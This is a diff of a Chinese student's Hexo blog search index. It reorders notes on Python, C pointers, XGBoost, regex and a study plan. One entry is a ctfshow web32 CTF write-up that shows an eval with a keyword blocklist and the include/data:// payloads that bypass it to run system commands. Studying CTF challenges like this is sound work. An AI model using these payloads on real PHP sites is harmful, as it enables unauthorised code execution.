+<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>py程序启动</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python读取文件</title>
     <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
@@ -2233,6 +2228,11 @@ print(year2)
   <entry>
     <title>sqlite库学习</title>
     <url>/2025/03/05/sqlite%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>re库</title>
+    <url>/2025/03/01/re%E5%BA%93/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -2296,6 +2296,46 @@ print(year2)
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二级好题积累:选择题</title>
+    <url>/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="二级好题集-持续更新"><a href="#二级好题集-持续更新" class="headerlink" title="二级好题集(持续更新)"></a>二级好题集(持续更新)</h1><h2 id="25-3-2"><a href="#25-3-2" class="headerlink" title="25.3.2"></a>25.3.2</h2><h3 id="关于最大元素的读取"><a href="#关于最大元素的读取" class="headerlink" title="关于最大元素的读取"></a>关于最大元素的读取</h3><img src="/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302185105408.png" class="" title="image-20250302185105408">
+
+<ul>
+<li><p><strong>请记住，不要直接硬生生地把这些数字带进去算，要读懂数字代表的什么</strong></p>
+</li>
+<li><p>比如这道题,**就需要你去把这个函数在干什么读懂:**这个函数是一个关于对数组最大值的选择的函数。</p>
+</li>
+<li><p>技巧:<strong>注意观察:</strong></p>
+</li>
+<li><ul>
+<li>变量增加的先后关系。比如:</li>
+<li>该函数<code>p</code>值首先增加，增加后,若是索引<code>k</code>的值没有比索引<code>p</code>的值更大，那么索引k讲变为索引p,注意这里的变化关系!</li>
+<li>即变量变化的先后顺序,先进行比较，后值发生改变。</li>
+<li>另外,*<em>为什么这里么可以让p直接赋值给初始化后的指针</em>P呢，不应该是把p的地址给<em>p吗,比如:<em>k &#x3D; &amp;p</em></em>                                                                  解答如下:</li>
+</ul>
+<ul>
+<li><p><code>&amp;k</code> 是取 <code>main</code> 函数中变量 <code>k</code> 的地址，传递给 <code>fun</code> 函数中的 <code>k</code> 。这就使得 <code>fun</code> 函数中的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code> ，也就是说，<code>fun</code> 函数中的 <code>*k</code> 和 <code>main</code> 函数中的 <code>k</code> 代表同一块内存空间，对 <code>*k</code> 的操作等同于对 <code>main</code> 函数中 <code>k</code> 的操作。</p>
+</li>
+<li><p>在 <code>fun</code> 函数的 <code>for</code> 循环初始化部分 <code>for( p=0, *k=p; p&lt;t; p++ )</code> 中：</p>
+<ul>
+<li><code>p</code> 是一个普通的整型变量，在循环初始化时被赋值为 <code>0</code> 。</li>
+<li><code>*k</code> 表示的是指针 <code>k</code> 所指向的内存单元中的值 。由于前面函数调用时 <code>fun</code> 函数的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code>，所以 <code>*k</code> 其实就是 <code>main</code> 函数中的 <code>k</code> 这个变量。</li>
+<li><code>*k = p</code> 这一步，就是把整型变量 <code>p</code> 的值赋给 <code>main</code> 函数中的 <code>k</code> 变量 。因为 <code>p</code> 和 <code>*k</code>（即 <code>main</code> 函数中的 <code>k</code> ）都是整型，所以可以直接进行赋值，而不是把 <code>p</code> 的地址赋值过去。</li>
+</ul>
+<p>如果写成 <code>*k = &amp;p</code> ，<code>&amp;p</code> 得到的是 <code>p</code> 这个变量在内存中的地址，属于 <code>int *</code> 类型，而 <code>*k</code> 是整型变量，两者类型不匹配，这样的赋值在 C 语言中是不允许的。</p>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>c语言</category>
+      </categories>
+      <tags>
+        <tag>二级好题</tag>
       </tags>
   </entry>
   <entry>
@@ -2399,46 +2439,6 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>二级好题积累:选择题</title>
-    <url>/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="二级好题集-持续更新"><a href="#二级好题集-持续更新" class="headerlink" title="二级好题集(持续更新)"></a>二级好题集(持续更新)</h1><h2 id="25-3-2"><a href="#25-3-2" class="headerlink" title="25.3.2"></a>25.3.2</h2><h3 id="关于最大元素的读取"><a href="#关于最大元素的读取" class="headerlink" title="关于最大元素的读取"></a>关于最大元素的读取</h3><img src="/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302185105408.png" class="" title="image-20250302185105408">
-
-<ul>
-<li><p><strong>请记住，不要直接硬生生地把这些数字带进去算，要读懂数字代表的什么</strong></p>
-</li>
-<li><p>比如这道题,**就需要你去把这个函数在干什么读懂:**这个函数是一个关于对数组最大值的选择的函数。</p>
-</li>
-<li><p>技巧:<strong>注意观察:</strong></p>
-</li>
-<li><ul>
-<li>变量增加的先后关系。比如:</li>
-<li>该函数<code>p</code>值首先增加，增加后,若是索引<code>k</code>的值没有比索引<code>p</code>的值更大，那么索引k讲变为索引p,注意这里的变化关系!</li>
-<li>即变量变化的先后顺序,先进行比较，后值发生改变。</li>
-<li>另外,*<em>为什么这里么可以让p直接赋值给初始化后的指针</em>P呢，不应该是把p的地址给<em>p吗,比如:<em>k &#x3D; &amp;p</em></em>                                                                  解答如下:</li>
-</ul>
-<ul>
-<li><p><code>&amp;k</code> 是取 <code>main</code> 函数中变量 <code>k</code> 的地址，传递给 <code>fun</code> 函数中的 <code>k</code> 。这就使得 <code>fun</code> 函数中的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code> ，也就是说，<code>fun</code> 函数中的 <code>*k</code> 和 <code>main</code> 函数中的 <code>k</code> 代表同一块内存空间，对 <code>*k</code> 的操作等同于对 <code>main</code> 函数中 <code>k</code> 的操作。</p>
-</li>
-<li><p>在 <code>fun</code> 函数的 <code>for</code> 循环初始化部分 <code>for( p=0, *k=p; p&lt;t; p++ )</code> 中：</p>
-<ul>
-<li><code>p</code> 是一个普通的整型变量，在循环初始化时被赋值为 <code>0</code> 。</li>
-<li><code>*k</code> 表示的是指针 <code>k</code> 所指向的内存单元中的值 。由于前面函数调用时 <code>fun</code> 函数的指针 <code>k</code> 指向了 <code>main</code> 函数中的变量 <code>k</code>，所以 <code>*k</code> 其实就是 <code>main</code> 函数中的 <code>k</code> 这个变量。</li>
-<li><code>*k = p</code> 这一步，就是把整型变量 <code>p</code> 的值赋给 <code>main</code> 函数中的 <code>k</code> 变量 。因为 <code>p</code> 和 <code>*k</code>（即 <code>main</code> 函数中的 <code>k</code> ）都是整型，所以可以直接进行赋值，而不是把 <code>p</code> 的地址赋值过去。</li>
-</ul>
-<p>如果写成 <code>*k = &amp;p</code> ，<code>&amp;p</code> 得到的是 <code>p</code> 这个变量在内存中的地址，属于 <code>int *</code> 类型，而 <code>*k</code> 是整型变量，两者类型不匹配，这样的赋值在 C 语言中是不允许的。</p>
-</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>c语言</category>
-      </categories>
-      <tags>
-        <tag>二级好题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>代码审计套路</title>
     <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
     <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
@@ -2494,20 +2494,38 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>命令执行:使用文件包含绕过</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
-<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
+    <title>决策树分类算法学习</title>
+    <url>/2025/03/01/%E5%86%B3%E7%AD%96%E6%A0%91%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="决策树分类算法学习"><a href="#决策树分类算法学习" class="headerlink" title="决策树分类算法学习"></a>决策树分类算法学习</h1><h2 id="XGBoost算法及其应用"><a href="#XGBoost算法及其应用" class="headerlink" title="XGBoost算法及其应用"></a>XGBoost算法及其应用</h2><h3 id="对于模型的保存"><a href="#对于模型的保存" class="headerlink" title="对于模型的保存"></a>对于模型的保存</h3><ul>
+<li><p>个人犯的错:</p>
+</li>
+<li><pre><code class="language-python"># 保存模型时应使用XGBoost原生方法
+self.xgb_model.save_model(&quot;./classifier/model/xgboost_model/xgboost_model.ubj&quot;) 
+#直接使用路径对模型进行加载
+class ContextAwareClassifier:
+    def __init__(self, xgb_model, bert_model, tokenizer_model, db_path, db_manager: ControlChatHistoryData, history_size):
+        &quot;&quot;&quot;传入参数:两种模型，分词器，数据库路径，历史记录长度&quot;&quot;&quot;
+
+        # 初始化数据库连接池
+        self.connection_pool = SQLiteConnectionPool(db_path)  # 初始化并列的类
+        self.xgb_model = xgb_model#这里我直接传入路径
+        self.bert_model = bert_model
+        self.tokenizer = BertTokenizer.from_pretrained(tokenizer_model)
+        self.db_manager = db_manager
+        self.history = deque(maxlen=history_size)  # 设置最大长度，超过最大长度的历史记录会被删除
+        
+#在后续步奏中,采用self.xgb_model.predict的方法直接对值进行预测，造成出错。
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 正确的方法:</span><br><span class="line"></span><br><span class="line">* ```python</span><br><span class="line">  class ContextAwareClassifier:</span><br><span class="line">      def __init__(self, xgb_model, bert_model, tokenizer_model, db_path, db_manager: ControlChatHistoryData, history_size):</span><br><span class="line">          &quot;&quot;&quot;传入参数:两种模型，分词器，数据库路径，历史记录长度&quot;&quot;&quot;</span><br><span class="line">  </span><br><span class="line">          # 初始化数据库连接池</span><br><span class="line">          self.connection_pool = SQLiteConnectionPool(db_path)  # 初始化并列的类</span><br><span class="line">          self.xgb_model = xgb.Booster()#先进行实例化，后加载模型</span><br><span class="line">          self.xgb_model.load_model(xgb_model)</span><br><span class="line">          self.bert_model = bert_model</span><br><span class="line">          self.tokenizer = BertTokenizer.from_pretrained(tokenizer_model)</span><br><span class="line">          self.db_manager = db_manager</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li></li>
+</ul>
 ]]></content>
       <categories>
-        <category>ctfshow web</category>
+        <category>ai</category>
       </categories>
       <tags>
-        <tag>命令执行</tag>
+        <tag>决策树</tag>
       </tags>
   </entry>
   <entry>
@@ -2549,62 +2567,25 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>决策树分类算法学习</title>
-    <url>/2025/03/01/%E5%86%B3%E7%AD%96%E6%A0%91%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="决策树分类算法学习"><a href="#决策树分类算法学习" class="headerlink" title="决策树分类算法学习"></a>决策树分类算法学习</h1><h2 id="XGBoost算法及其应用"><a href="#XGBoost算法及其应用" class="headerlink" title="XGBoost算法及其应用"></a>XGBoost算法及其应用</h2><h3 id="对于模型的保存"><a href="#对于模型的保存" class="headerlink" title="对于模型的保存"></a>对于模型的保存</h3><ul>
-<li><p>个人犯的错:</p>
-</li>
-<li><pre><code class="language-python"># 保存模型时应使用XGBoost原生方法
-self.xgb_model.save_model(&quot;./classifier/model/xgboost_model/xgboost_model.ubj&quot;) 
-#直接使用路径对模型进行加载
-class ContextAwareClassifier:
-    def __init__(self, xgb_model, bert_model, tokenizer_model, db_path, db_manager: ControlChatHistoryData, history_size):
-        &quot;&quot;&quot;传入参数:两种模型，分词器，数据库路径，历史记录长度&quot;&quot;&quot;
-
-        # 初始化数据库连接池
-        self.connection_pool = SQLiteConnectionPool(db_path)  # 初始化并列的类
-        self.xgb_model = xgb_model#这里我直接传入路径
-        self.bert_model = bert_model
-        self.tokenizer = BertTokenizer.from_pretrained(tokenizer_model)
-        self.db_manager = db_manager
-        self.history = deque(maxlen=history_size)  # 设置最大长度，超过最大长度的历史记录会被删除
-        
-#在后续步奏中,采用self.xgb_model.predict的方法直接对值进行预测，造成出错。
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 正确的方法:</span><br><span class="line"></span><br><span class="line">* ```python</span><br><span class="line">  class ContextAwareClassifier:</span><br><span class="line">      def __init__(self, xgb_model, bert_model, tokenizer_model, db_path, db_manager: ControlChatHistoryData, history_size):</span><br><span class="line">          &quot;&quot;&quot;传入参数:两种模型，分词器，数据库路径，历史记录长度&quot;&quot;&quot;</span><br><span class="line">  </span><br><span class="line">          # 初始化数据库连接池</span><br><span class="line">          self.connection_pool = SQLiteConnectionPool(db_path)  # 初始化并列的类</span><br><span class="line">          self.xgb_model = xgb.Booster()#先进行实例化，后加载模型</span><br><span class="line">          self.xgb_model.load_model(xgb_model)</span><br><span class="line">          self.bert_model = bert_model</span><br><span class="line">          self.tokenizer = BertTokenizer.from_pretrained(tokenizer_model)</span><br><span class="line">          self.db_manager = db_manager</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li></li>
-</ul>
-]]></content>
-      <categories>
-        <category>ai</category>
-      </categories>
-      <tags>
-        <tag>决策树</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>数据库基本概念</title>
     <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>日程表</title>
-    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
-    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
-<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
-<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
-<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
-<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
-<p>另外别忘了干洗。</p>
-<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
-<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
 ]]></content>
       <categories>
-        <category>个人安排</category>
+        <category>ctfshow web</category>
       </categories>
       <tags>
-        <tag>大一寒假安排</tag>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2650,21 +2631,22 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>正则匹配注意点个人笔记</title>
-    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里只匹配mat<br>但是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里就会把fat,sat,mat都给匹配上</p>
-<p><strong>总结:</strong></p>
-<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+    <title>日程表</title>
+    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
+    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
+<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
+<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
+<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
+<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
+<p>另外别忘了干洗。</p>
+<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
+<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
 ]]></content>
       <categories>
-        <category>php</category>
+        <category>个人安排</category>
       </categories>
       <tags>
-        <tag>正则匹配</tag>
+        <tag>大一寒假安排</tag>
       </tags>
   </entry>
   <entry>
@@ -2798,6 +2780,24 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
+    <title>正则匹配注意点个人笔记</title>
